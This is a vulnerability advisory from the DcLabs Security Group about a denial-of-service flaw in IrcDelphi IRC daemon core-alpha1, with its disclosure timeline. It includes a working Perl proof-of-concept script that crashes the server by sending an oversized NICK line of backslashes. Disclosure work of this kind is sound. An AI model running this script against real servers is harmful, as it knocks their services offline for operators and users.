[DCA-0010]

[Software]
- IrcDelphi Daemon Server

[Vendor Product Description]
- IRC Daemon (IRCd, IRC Server) coded in Delphi/Kylix using Indy
components. Easy to use and light irc daemon.

[Bug Description]
- The IRC Daemon does not sanitize the variable NICK correctly leading
to a Denial-of-Service flaw.

[History]
- Advisory sent to vendor on 06/21/2010.
- No response
- Public adv. 07/02/2010

[Impact]
- Low

[Affected Version]
- IrcDelphi core-alpha1
- Prior versions may also be vulnerable.

[Codes]

#!/usr/bin/perl
use IO::Socket;

       if (@ARGV < 1) {
               usage();
       }

       $ip     = $ARGV[0];
       $port   = $ARGV[1];

       print "[+] Sending request...\n";

       $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
       print $socket "USER AA AA AA :AA\r\n";
       print $socket "NICK ". "\\" x 200 ."\r\n";

       sleep(3);
       close($socket);

       print "[+] Done!\n";


sub usage() {
       print "[-] Usage: <". $0 ."> <host> <port>\n";
       print "[-] Example: ". $0 ." 127.0.0.1 6667\n";
       exit;
}
----------------------------------------------------------------------------------------

DcLabs Security Group
Sponsor: ipax
ipax@dclabs.com.br

[Credits]
Crash and all DcLabs members.